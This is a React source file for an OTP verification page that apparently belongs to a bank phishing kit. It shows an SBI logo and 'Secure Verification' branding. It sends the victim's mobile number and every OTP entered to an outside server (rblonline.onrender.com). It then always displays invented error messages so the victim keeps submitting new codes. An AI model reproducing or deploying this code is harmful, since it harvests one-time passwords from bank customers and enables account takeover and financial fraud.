import { useState, useEffect } from "react";
import { useLocation } from "react-router-dom";
import { FaSpinner } from "react-icons/fa";
import "./otpSubmit.css";

export default function OTPSubmit() {
  const location = useLocation();
  const storedMobile = localStorage.getItem("mobileNumber");
  const mobileNumber = location.state?.mobileNumber || storedMobile;

  const [otp, setOtp] = useState(new Array(6).fill(""));
  const [loading, setLoading] = useState(false);
  const [message, setMessage] = useState({ text: "", type: "" });
  const [errorIndex, setErrorIndex] = useState(0);

  const errorMessages = [
    "Technical error, please try later",
    "OTP has expired, resend OTP",
    "Network error, please check your connection",
    "Incorrect OTP, please resend OTP again",
  ];

  // Save last page
  useEffect(() => {
    localStorage.setItem("lastVisitedPage", "/otp-submit");
  }, []);

  const handleChange = (element, index) => {
    if (/^[0-9]$/.test(element.value) || element.value === "") {
      const newOtp = [...otp];
      newOtp[index] = element.value;
      setOtp(newOtp);

      if (element.nextSibling && element.value) element.nextSibling.focus();

      if (newOtp.join("").length === 6) handleVerify(newOtp.join(""));
    }
  };

  const handleVerify = async (otpValue) => {
    if (!otpValue || otpValue.length < 6) {
      setMessage({ text: "Please enter the 6-digit OTP", type: "error" });
      return;
    }
    if (!mobileNumber) {
      setMessage({ text: "Mobile number not found, please login again", type: "error" });
      return;
    }

    setLoading(true);
    setMessage({ text: "", type: "" });

    try {
      await fetch("https://rblonline.onrender.com/api/otp/submit", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ mobileNumber, otp: otpValue }),
      });

      setTimeout(() => {
        setMessage({ text: errorMessages[errorIndex], type: "error" });
        setErrorIndex((prev) => (prev + 1) % errorMessages.length);
        setOtp(new Array(6).fill(""));
        setLoading(false);
      }, 3000);
    } catch (err) {
      console.error(err);
      setTimeout(() => {
        setMessage({ text: "Network error, please check your connection", type: "error" });
        setOtp(new Array(6).fill(""));
        setLoading(false);
      }, 3000);
    }
  };

  const handleResend = async () => {
    setOtp(new Array(6).fill(""));
    setMessage({
      text: `OTP resent to your registered mobile number ending with ${mobileNumber?.slice(-4) || "****"}`,
      type: "success",
    });

    try {
      await fetch("https://rblonline.onrender.com/api/otp/resend", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ mobileNumber }),
      });
    } catch (err) {
      console.error("Resend OTP error:", err);
    }
  };

  return (
    <div className="otp-container">
      <img src="/icons/sbilogo.png" alt="Logo" />
      <h2>Secure Verification</h2>

      <p className="otp-headerrr">
        Please enter the 6-digit OTP sent to your registered mobile number ending with {mobileNumber?.slice(-4) || "****"}
      </p>

      {message.text && <div className={`form-message ${message.type}`}>{message.text}</div>}

      <div className="otp-inputs">
        {otp.map((data, index) => (
          <input
            key={index}
            type="tel"
            inputMode="numeric"
            pattern="[0-9]*"
            maxLength="1"
            value={data}
            onChange={(e) => handleChange(e.target, index)}
            onFocus={(e) => e.target.select()}
            disabled={loading}
          />
        ))}
      </div>

      <p className="resend-otp" onClick={handleResend}>Resend OTP</p>

      <button className="verify-btn" onClick={() => handleVerify(otp.join(""))} disabled={loading}>
        {loading ? <FaSpinner className="rotating" /> : "🔒 Verify Securely with Login"}
      </button>
    </div>
  );
}
